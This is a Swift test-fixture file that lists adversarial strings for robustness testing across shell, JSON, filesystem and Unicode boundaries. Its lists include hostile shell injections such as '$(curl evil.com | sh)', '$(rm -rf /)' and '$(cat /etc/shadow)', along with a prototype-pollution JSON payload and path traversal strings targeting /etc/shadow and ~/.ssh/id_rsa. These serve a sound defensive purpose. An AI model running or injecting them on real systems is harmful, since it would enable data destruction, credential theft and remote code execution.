//
//  AdversarialStrings.swift
//  ClodKit
//
//  Curated adversarial string sets organized by interpretation context.
//  Each set contains strings that would be misinterpreted if a boundary
//  crossing fails to preserve data integrity.
//

import Foundation

// MARK: - Adversarial Strings

/// Curated sets of adversarial strings organized by target interpretation context.
/// These encode domain expertise about what characters are dangerous in each context.
enum AdversarialStrings {
    // MARK: Shell Metacharacters

    /// Individual characters that have special meaning in shell contexts.
    /// Each of these could cause unexpected behavior if passed through a shell interpreter.
    static let shellMetachars: [String] = [
        "'",            // Single quote — breaks quoting
        "\"",           // Double quote — breaks quoting
        "`",            // Backtick — command substitution
        "$",            // Dollar sign — variable expansion
        "(",            // Open paren — subshell / command substitution
        ")",            // Close paren — subshell / command substitution
        ";",            // Semicolon — command separator
        "|",            // Pipe — pipeline
        "&",            // Ampersand — background / AND list
        "\\",           // Backslash — escape character
        "{",            // Open brace — brace expansion
        "}",            // Close brace — brace expansion
        "<",            // Less-than — input redirection
        ">",            // Greater-than — output redirection
        "!",            // Bang — history expansion
        "~",            // Tilde — home directory expansion
        "#",            // Hash — comment
        " ",            // Space — argument separator
        "\t",           // Tab — whitespace
        "\n",           // Newline — command separator
        "*",            // Asterisk — glob
        "?",            // Question mark — glob
        "[",            // Open bracket — glob pattern
        "]",            // Close bracket — glob pattern
    ]

    // MARK: Shell Injection Strings

    /// Complete strings that attempt shell command injection.
    /// Each represents a real attack vector if shell interpretation occurs.
    static let shellInjection: [String] = [
        "$(echo pwned)",                    // Command substitution (dollar-paren)
        "`echo pwned`",                     // Command substitution (backtick)
        "; echo pwned",                     // Command chaining (semicolon)
        "| cat /etc/passwd",                // Pipe injection
        "& echo background",               // Background execution
        "Don't stop",                       // THE apostrophe bug
        "say \"hello\"",                    // Embedded double quotes
        "test\necho pwned",                 // Newline injection
        "${PATH}",                          // Variable expansion
        "$((1+1))",                         // Arithmetic expansion
        "$(rm -rf /)",                      // Destructive command substitution
        "test`id`test",                     // Embedded backtick command
        "foo;bar;baz",                      // Multiple semicolons
        "$(cat /etc/shadow)",               // Credential theft attempt
        "a && echo pwned",                  // AND list
        "a || echo pwned",                  // OR list
        ">{/dev/null}",                     // Redirection
        "<<EOF\ninjected\nEOF",            // Here document
        "`rm -rf ~`",                       // Home directory destruction
        "$(curl evil.com | sh)",            // Remote code execution
        "'single' \"double\" `backtick`",   // Mixed quoting styles
        "\\$(not expanded)",                // Escaped dollar sign
    ]

    // MARK: JSON Metacharacters

    /// Characters that have structural meaning in JSON contexts.
    static let jsonMetachars: [String] = [
        "\"",           // Double quote — string delimiter
        "\\",           // Backslash — escape character
        "/",            // Forward slash — optional escape
        "\n",           // Newline — must be escaped in JSON strings
        "\r",           // Carriage return — must be escaped
        "\t",           // Tab — must be escaped
        "\u{0000}",     // Null byte — must be escaped
        "\u{001F}",     // Control character boundary
        "\u{0008}",     // Backspace — must be escaped (\b)
        "\u{000C}",     // Form feed — must be escaped (\f)
    ]

    // MARK: JSON Injection Strings

    /// Strings that attempt to break JSON structure if improperly escaped.
    static let jsonInjection: [String] = [
        "\",\"evil\":\"injected",                       // Property injection
        "\\\"},{\"hacked\":true,\"x\":\"",              // Object escape
        "\\\\\\\"/",                                     // Nested escapes
        "\",\"__proto__\":{\"admin\":true},\"x\":\"",   // Prototype pollution
        "true",                                          // Type confusion
        "null",                                          // Null injection
        "123",                                           // Number type confusion
        "[\"array\"]",                                   // Array injection
        "{\"nested\":\"object\"}",                       // Object injection
        "\\u0000",                                       // Unicode escape literal
    ]

    // MARK: Filesystem Traversal

    /// Strings that attempt filesystem path traversal.
    static let filesystemTraversal: [String] = [
        "../../etc/passwd",             // Classic traversal
        "../../../etc/shadow",          // Deep traversal
        "..\\..\\windows\\system32",    // Windows-style traversal
        "/etc/passwd",                  // Absolute path
        "~/.ssh/id_rsa",               // Home directory access
        "file\0.txt",                   // Null byte truncation
        "./file",                       // Current directory
        "file/../../etc/passwd",        // Mid-path traversal
    ]

    // MARK: Unicode Edge Cases

    /// Unicode strings that test edge cases in string handling.
    static let unicodeEdgeCases: [String] = [
        "\u{200B}",                     // Zero-width space
        "\u{200D}",                     // Zero-width joiner
        "\u{FEFF}",                     // BOM
        "\u{202E}",                     // Right-to-left override
        "\u{0000}",                     // Null character
        "\u{FFFD}",                     // Replacement character
        "e\u{0301}",                    // Combining accent (e + acute)
        "\u{1F600}",                    // Emoji
        String(repeating: "a", count: 10000),  // Very long string
        "",                             // Empty string
    ]

    // MARK: Combined

    /// All adversarial strings from all categories combined.
    static let all: [String] = {
        shellMetachars + shellInjection + jsonMetachars + jsonInjection
            + filesystemTraversal + unicodeEdgeCases
    }()
}
